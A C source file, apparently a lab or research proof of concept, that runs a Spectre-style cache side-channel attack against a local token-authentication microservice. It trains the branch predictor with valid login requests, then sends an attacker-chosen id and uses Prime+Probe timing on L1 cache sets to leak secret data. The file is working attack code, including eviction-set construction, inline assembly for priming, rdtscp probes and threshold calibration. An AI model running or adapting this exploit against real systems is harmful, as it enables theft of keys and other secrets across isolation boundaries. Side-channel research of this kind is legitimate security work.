#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <curl/curl.h>

#include "attacker.h"

#define WAYS 8
#define SETS 64
#define LINE_SIZE 64
#define L1_SIZE (WAYS * SETS * LINE_SIZE)
#define NO_LINES (WAYS * SETS)

#define INDEXES_PER_LINE (LINE_SIZE / sizeof(int))
#define PROBE_ARR_SIZE (L1_SIZE/sizeof(int))

#define TRAINING_REPS 100
#define ATTACK_RUNS 100.0

#define EVICTION_THRESHOLD 20
// ADDRESS SECRET_KEY[0] -> 0x555555556008

unsigned int probe_array[PROBE_ARR_SIZE] __attribute__((aligned(4096))); // allocates int array of size = L1_SIZE and aligns to page
struct primelist_t *heads[64];

CURL *curl_handle;

uint64_t c_threshold;
int main(int argc, char* argv[]) {
    printf("Probe array base address: %p\n", (void*)probe_array);
    printf("expected cache set for byte value 0x91 (145):\n");

    
    setup_linked_lists();

    // find threshold
    c_threshold = 100; //cache_threshold(); // or set ~100

    // prep attack and training data for request
    char *valid_data = valid_data = "username=user1&password=password&id=2";;
    char attack_data[64];
    get_inputs(attack_data, argc, argv);
    

    // set up curl 
    curl_global_init(CURL_GLOBAL_ALL);
    curl_handle = curl_easy_init();
    if (curl_handle){
        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
    }

    //  ==================== PRIME + PROBE ===================
    int count[SETS] = {0}; // records sets that have been touched

    // 100 attack runs
    for (int j = 0; j < 100; j++) {

        
        int valid_baseline[SETS] = {0};    

        int loops = ATTACK_RUNS;
        while (loops > 0){
            // Train BP
            for(int i = 0; i < TRAINING_REPS; i++){
                    prime_cache(); // prime L1 with probe array

                    _mm_mfence();
                    make_request(valid_data); // send valid credentials
                    _mm_mfence();
                    // adds to count to calculate baseline
                    check_cache_presence(valid_baseline);
                }
            
            
            prime_cache(); // prime L1 with probe array

            _mm_mfence(); // wait for prime to compelte before sending bad request
            // cache check 
            make_request(attack_data);
            _mm_mfence();
            
            check_cache_presence(count);
            loops --;
        }

        
        printf("COMPLETED ATTACK CYCLE: %d/100\n", j);
    }
    
    for (int j = 0; j < SETS; j++){
        printf("SET %d: %d evictions\n", j, count[j]);
    }
    curl_easy_cleanup(curl_handle);
    return 0;
}

void setup_linked_lists() {
    for (int s = 0; s < 64; s++) {
        struct primelist_t *prev = NULL;
        for (int w = 0; w < WAYS; w++) {
            // (Way * Total Sets * Line Size) + (Current Set * Line Size)
            uintptr_t addr = (uintptr_t)probe_array + (w * SETS * LINE_SIZE) + (s * 64);
            struct primelist_t *current = (struct primelist_t *)addr;

            if (prev) {
                prev->probe = current; // forwards for probing
                current->prime = prev; // backwards for priming
            } else {
                heads[s] = current; // beginning of list
                current->prime = NULL;
            }
            prev = current;
        }
        prev->probe = NULL; // List end
    }
}


void prime_cache(){
    // prime L1 
    // just need to hit each cache line once 
    for (int i = 0; i < 5; i++){
        for (int s = 0; s < 64; s++) {
            struct primelist_t *curr = heads[s];
            
            // assembly to jump through prime ptrs
            asm volatile (
                "1:                     \n"
                "  mov 8(%0), %0        \n" 
                "  test %0, %0          \n"
                "  jne 1b               \n"
                : "+r" (curr)
                : 
                : "memory"
            );
        }
    }
}

void check_cache_presence(int *count){
    
    for (int s = 0; s < 64; s++) {
        struct primelist_t *curr = heads[s];
        int set_evictions = 0;

        // traverse using the probe ptr at offset 0
        while (curr != NULL && curr->probe != NULL) {
            uint64_t t1, t2;
            unsigned int pid;

            _mm_lfence();
            t1 = __rdtscp(&pid);
            _mm_lfence();

            curr = curr->probe; // load val from mem

            _mm_lfence();
            t2 = __rdtscp(&pid);
            _mm_lfence();

            // if > threshold add miss
            if ((t2 - t1) > c_threshold) {
                set_evictions++;
            }
        }

        if (set_evictions > 0) {
            count[s]++;
        }
    }
    
    // printf("%d/%d cache hits\n", present, NO_LINES);
}

// finds hit and miss time  -need to implement loop to find avg + determine cache threshold
volatile int test_data = 2;
uint64_t cache_threshold(){
    uint64_t t1, t2, time; 
    uint64_t min = UINT64_MAX;
    uint64_t max = 0;
    unsigned int pid;

    for (int i = 0; i < 1000; i++){
        pid = test_data;
        pid = test_data;

        _mm_lfence();
        t1 = __rdtscp(&pid);
        _mm_lfence();

        pid = test_data;

        _mm_lfence();
        t2 = __rdtscp(&pid);
        _mm_lfence();

        time = t2 - t1;
        if (time > max){
            max = time;
        }
        //printf("hit Time: %ld, %d\n", time, junk);
    }


    for (int i = 0; i < 1000; i++){
        _mm_clflush((void*)&test_data);
        _mm_mfence();

        _mm_lfence();
        t1 = __rdtscp(&pid);
        _mm_lfence();

        pid = test_data;

        t2 = __rdtscp(&pid);
        _mm_lfence();

        time = t2 - t1;
        if (min > time){
            min = time;
        }
    }
    printf("fastest miss: %ld\nslowest hit: %ld\n", min, max);
    uint64_t threshold = (min + max)/2;
    return threshold;
}


// send request with curl request for token to microservice
void make_request(char *data){
    curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
    curl_easy_perform(curl_handle); 
}

// returns junk so that curl doesnt write to console
size_t write_junk(void *buffer, size_t size, size_t nmemb, void *userp)
{
    (void)buffer;
    (void)userp;
    return size * nmemb;
}


void get_inputs(char attack_data[], int argc, char* argv[]){
    char *attack_id = "2";
    if (argc == 2){
        attack_id = argv[1]; 
    }
    snprintf(attack_data, 64, "username=user1&password=password&id=%s", attack_id);
    
}